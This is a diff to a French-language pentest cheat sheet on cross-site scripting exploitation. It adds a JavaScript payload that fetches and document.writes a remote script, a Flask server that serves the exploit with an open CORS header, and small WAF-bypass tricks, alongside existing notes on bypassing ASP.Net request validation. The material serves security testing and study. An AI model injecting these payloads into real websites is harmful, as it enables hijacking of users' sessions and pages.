@@ -122,7 +122,7 @@ seekSegmentTime
 
 ## Exploitation
 
-Cette section contient des tips & trics sur l'exploitation de XSS.
+Cette section contient des tips & tricks sur l'exploitation de XSS.
 
 ### ASP.Net
 ASP.Net a le mécanisme de "Request Validation" qui bloque de nombreuses tentatives XSS. Globalement tout payload de la forme "<a" (où a est une lettre ou le caractère ! sera bloqué).
@@ -139,6 +139,38 @@ D'autres bypass [Bypassing .Net ValidateRequest](http://www.procheckup.com/media
 
 Il est possbible d'exploiter une XSS dans un champ hidden. Voir [XSS in Hidden Input Fields](http://blog.portswigger.net/2015/11/xss-in-hidden-input-fields.html)
 
+### Charger un script distant
+Basé sur [Calling remote script with event handlers](https://brutelogic.com.br/blog/calling-remote-script-with-event-handlers/).
+
+``` javascript
+fetch('http://127.0.0.1:5000/').then(function(r){return r.text();}).then(function(w){document.write(w)});
+```
+
+Côté serveur (avec flask):
+
+``` python
+from flask import Flask, Response
+app = Flask(__name__)
+
+@app.route('/')
+def root():
+    f = open('exploit.html','r')
+    response = Response(f.read())
+    response.headers['Access-Control-Allow-Origin'] = '*'
+    f.close()
+    return response
+```
+
+
+### Contournement de WAF
+
+Quelques astuces pour contourner des WAF:
+
+```
+a = document; a.write('Test'); // Contourne des restrictions sur document.write*
+(a = document); a.write('Test') // Contourne des restrictions sur le ";"
+```
+
 ## Références
 - [JSFuck](http://www.jsfuck.com/)
 - [Master the art of Cross Site Scripting](https://brutelogic.com.br/blog/)
@@ -146,6 +178,7 @@ Il est possbible d'exploiter une XSS dans un champ hidden. Voir [XSS in Hidden I
 - [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
 - [PassiveXssScan](https://github.com/jkadijk/burp-plugins): un plugin pour identifier automatiquement les éléments "reflected" dans Burp.
 - [HTML5sec](https://html5sec.org/)
+- [Calling remote script with event handlers](https://brutelogic.com.br/blog/calling-remote-script-with-event-handlers/)
 
 ### Challenges
 - [FindBUG XSS Challenge](http://blog.bi.tk/2017/01/20/findbug/)
